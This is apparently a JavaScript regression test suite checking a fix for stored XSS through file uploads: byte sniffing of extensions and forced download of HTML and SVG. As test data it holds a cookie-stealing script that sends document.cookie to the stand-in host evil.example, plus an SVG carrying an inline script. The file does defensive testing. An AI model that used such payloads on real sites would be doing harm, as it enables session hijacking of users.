/**
 * P0-1 regression: stored XSS via the upload extension.
 *
 * Before the fix, the multer filter trusted the client's multipart
 * Content-Type and kept path.extname(originalname) verbatim, so a part sent as
 * `image/png` named `evil.html` was stored as `evil-<uuid>.html` — and the
 * static server only force-downloaded `.svg`, so it came back text/html INLINE
 * from the API origin where the session cookie lives.
 *
 * These assert the two halves of the fix: the bytes decide the stored
 * extension, and only passive media is served inline.
 */
import './setup.js';
import request from 'supertest';
import fs from 'fs';
import path from 'path';
import { v4 as uuidv4 } from 'uuid';
import { getApp, closeDb, createTestUser } from './helpers.js';

let app, token;

const uploadsDir = path.join(process.cwd(), 'uploads');
const writtenProbes = [];

// A real 1x1 PNG signature — enough bytes for the sniffer.
const PNG_BYTES = Buffer.from([
  0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
  0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
  0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53, 0xde
]);

const HTML_PAYLOAD = Buffer.from('<html><script>document.location="https://evil.example/"+document.cookie</script></html>');

function writeProbe(type, filename, contents) {
  const dir = path.join(uploadsDir, type);
  fs.mkdirSync(dir, { recursive: true });
  const filePath = path.join(dir, filename);
  fs.writeFileSync(filePath, contents);
  writtenProbes.push(filePath);
  return `/uploads/${type}/${filename}`;
}

beforeAll(async () => {
  app = await getApp();
  ({ token } = await createTestUser({ role: 'admin' }));
});

afterAll(async () => {
  for (const p of writtenProbes) {
    try { fs.unlinkSync(p); } catch { /* already gone */ }
  }
  await closeDb();
});

describe('upload content guard', () => {
  it('never stores a client-supplied executable extension (image/png named evil.html)', async () => {
    const res = await request(app)
      .post('/api/uploads/single?type=images')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', PNG_BYTES, { filename: 'evil.html', contentType: 'image/png' });

    expect(res.status).toBe(200);
    const { filename, url } = res.body.data.file;
    expect(filename).not.toMatch(/\.html$/i);
    expect(filename).toMatch(/\.png$/);
    expect(url).toMatch(/\.png$/);
    writtenProbes.push(path.join(uploadsDir, 'images', filename));

    // ...and it is served as an image, not as a document the browser executes.
    const served = await request(app).get(`/uploads/images/${filename}`);
    expect(served.status).toBe(200);
    expect(served.headers['content-type']).toMatch(/^image\/png/);
    expect(served.headers['x-content-type-options']).toBe('nosniff');
  });

  it('rejects a file whose real bytes are HTML even when declared image/png', async () => {
    const res = await request(app)
      .post('/api/uploads/single?type=images')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', HTML_PAYLOAD, { filename: 'x.png', contentType: 'image/png' });

    expect(res.status).toBe(400);
    expect(res.body.success).toBe(false);
  });

  it('rejects a PDF smuggled into the image category under an image/png header', async () => {
    const res = await request(app)
      .post('/api/uploads/single?type=images')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', Buffer.from('%PDF-1.4 smuggled'), { filename: 'x.png', contentType: 'image/png' });

    expect(res.status).toBe(400);
  });

  it('stores the extension the bytes say, not the one the header claims', async () => {
    const res = await request(app)
      .post('/api/uploads/single?type=images')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', PNG_BYTES, { filename: 'mislabelled.gif', contentType: 'image/gif' });

    expect(res.status).toBe(200);
    expect(res.body.data.file.filename).toMatch(/\.png$/);
    expect(res.body.data.file.mimetype).toBe('image/png');
    writtenProbes.push(path.join(uploadsDir, 'images', res.body.data.file.filename));
  });

  it('still accepts a genuine PNG upload', async () => {
    const res = await request(app)
      .post('/api/uploads/single?type=images')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', PNG_BYTES, { filename: 'legit.png', contentType: 'image/png' });

    expect(res.status).toBe(200);
    expect(res.body.data.file.mimetype).toBe('image/png');
    writtenProbes.push(path.join(uploadsDir, 'images', res.body.data.file.filename));
  });
});

describe('static /uploads serving', () => {
  it('force-downloads a stored .html instead of serving it inline', async () => {
    const url = writeProbe('general', `p0-1-probe-${uuidv4()}.html`, HTML_PAYLOAD);

    const res = await request(app).get(url);

    expect(res.status).toBe(200);
    expect(res.headers['content-disposition']).toBe('attachment');
    expect(res.headers['content-type']).toMatch(/^application\/octet-stream/);
    expect(res.headers['x-content-type-options']).toBe('nosniff');
  });

  it('force-downloads .svg (the case that was already special-cased)', async () => {
    const url = writeProbe('general', `p0-1-probe-${uuidv4()}.svg`, Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'));

    const res = await request(app).get(url);

    expect(res.headers['content-disposition']).toBe('attachment');
    expect(res.headers['content-type']).toMatch(/^application\/octet-stream/);
  });

  it('still serves allowlisted media inline', async () => {
    const url = writeProbe('general', `p0-1-probe-${uuidv4()}.png`, PNG_BYTES);

    const res = await request(app).get(url);

    expect(res.status).toBe(200);
    expect(res.headers['content-disposition']).toBeUndefined();
    expect(res.headers['content-type']).toMatch(/^image\/png/);
  });
});
